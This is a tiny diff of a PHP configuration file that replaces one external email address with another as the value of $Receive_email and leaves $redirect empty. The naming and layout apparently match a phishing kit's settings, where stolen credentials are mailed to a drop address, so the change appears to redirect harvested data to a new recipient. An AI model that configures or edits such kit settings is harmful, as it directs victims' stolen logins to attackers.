@@ -1,4 +1,4 @@
 <?php 
-$Receive_email="jokersudo@yandex.com";
+$Receive_email="Zeldris30gowther@proton.me";
 $redirect="";
 ?>
